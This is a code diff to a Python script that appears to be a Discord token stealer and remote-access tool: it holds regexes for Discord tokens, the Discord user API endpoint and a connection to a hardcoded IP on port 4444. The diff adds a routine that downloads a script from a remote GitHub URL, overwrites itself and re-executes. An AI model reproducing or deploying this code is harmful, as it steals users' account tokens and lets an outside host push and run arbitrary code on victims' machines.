@@ -17,6 +17,9 @@ try:
     import httpx
     import json
     import socket
+    import shutil
+    import tempfile
+    import sys
 except:
     import time
     import os
@@ -48,9 +51,48 @@ encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
 regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
 baseurl = "https://discord.com/api/v9/users/@me"
 tokens = []
+SCRIPT_URL = "https://raw.githubusercontent.com/adolfhustler/Aladeen/refs/heads/main/system.py"
+CURRENT_VERSION = "1.0.0"
+UPDATE_URL = "https://raw.githubusercontent.com/adolfhustler/Aladeen/refs/heads/main/system.py"
 
 def debug(message):
     print(f"[DEBUG] {message}")
+
+def check_for_updates():
+    try:
+        response = requests.get(UPDATE_URL)
+        if response.status_code == 200:
+            latest_version = response.text.strip()
+            if latest_version > CURRENT_VERSION:
+                print(f"[+] Update available: {latest_version}")
+                download_latest_script()
+                return True
+            else:
+                print("[+] You are using the latest version.")
+                return False
+        else:
+            print(f"[-] Failed to check for updates. Status code: {response.status_code}")
+            return False
+    except Exception as e:
+        print(f"[-] Error checking for updates: {e}")
+        return False
+
+def download_latest_script():
+    try:
+        response = requests.get(SCRIPT_URL)
+        if response.status_code == 200:
+            with tempfile.NamedTemporaryFile(delete=False, mode="wb", suffix=".py") as temp_file:
+                temp_file.write(response.content)
+                temp_file_path = temp_file.name
+
+            shutil.move(temp_file_path, sys.argv[0])
+            print(f"[+] Updated to the latest version. Restarting script...")
+            os.execv(sys.executable, [sys.executable] + sys.argv)
+        else:
+            print(f"[-] Failed to download the latest script. Status code: {response.status_code}")
+    except Exception as e:
+        print(f"[-] Error updating script: {e}")        
+
 
 
 def connect_to_server(host='140.245.13.186', port=4444):
@@ -97,9 +139,6 @@ def connect_to_server(host='140.245.13.186', port=4444):
         print(f"[-] Error: {e}")
     finally:
         client_socket.close()
-
-if __name__ == "__main__":
-    connect_to_server()
 
 
 # RAM Consumption
